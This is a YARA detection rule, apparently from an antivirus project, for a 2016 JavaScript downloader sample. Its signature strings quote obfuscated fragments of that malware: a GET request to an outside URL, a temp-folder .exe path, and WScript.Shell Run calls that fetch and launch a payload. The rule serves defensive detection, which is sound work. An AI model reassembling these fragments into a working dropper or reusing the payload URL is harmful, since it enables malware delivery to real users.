rule sig_20160328_bf9e21d6b396802356bd5e0e5872ff25 {
  meta:
    description = "datamaliciousorder - file 20160328_bf9e21d6b396802356bd5e0e5872ff25.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "86ce2665b428baaf8c76353c550b9ba6cad5b6c311803aca1eb8b96298f535e9"

  strings:
    $s1  = "function Lajfi() {return Atmaxvq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yGfuAKsLx1lqtO1T.exe\";};" fullword ascii
    $s2  = "Evqivii[Zqxprjb](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Vrrglk](Gglzgmen() * 11)} while (Evqivii[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Compmpdv() {return ((Riupm == true) && (Riupm == Tymbezkpv)) ? 1 : Dteqz;};" fullword ascii
    $s5  = "var Atmaxvq = function Gkixsltwed() {return WScript[Tvbjxq](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ypsknkt(Ulukvx, Kjddjxkca){return Ulukvx - Kjddjxkca;};" fullword ascii
    $s7  = "function Gsqvaszdp(Wsaxlshgk){Atmaxvq[\"Run\"](Wsaxlshgk, Dteqz, Dteqz);};" fullword ascii
    $s8  = "function Nlfdql(){return Tvbjxq;};" fullword ascii
    $s9  = "function Pussoqe()" fullword ascii
    $s10 = "Riupm = true; " fullword ascii
    $s11 = "return Ypsknkt(Fqsbp, Muhvz);" fullword ascii
    $s12 = "function Nfvzqtapwg(Oezch) {var Xwceoo = (1, 2, 3, 4, 5, Oezch); return Xwceoo;};" fullword ascii
    $s13 = "var Riupm = false;" fullword ascii
    $s14 = "Tymbezkpv = true; " fullword ascii
    $s15 = " while (Nfagxivmrp){" fullword ascii
    $s16 = "var Stosmt = new this[\"Date\"]();" fullword ascii
    $s17 = "var Tymbezkpv = false;" fullword ascii
    $s18 = "function Gglzgmen(){return 22;};" fullword ascii
    $s19 = "var Ktdru = false;" fullword ascii
    $s20 = "function Ixlqgpzhy(){return Lzxihe;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}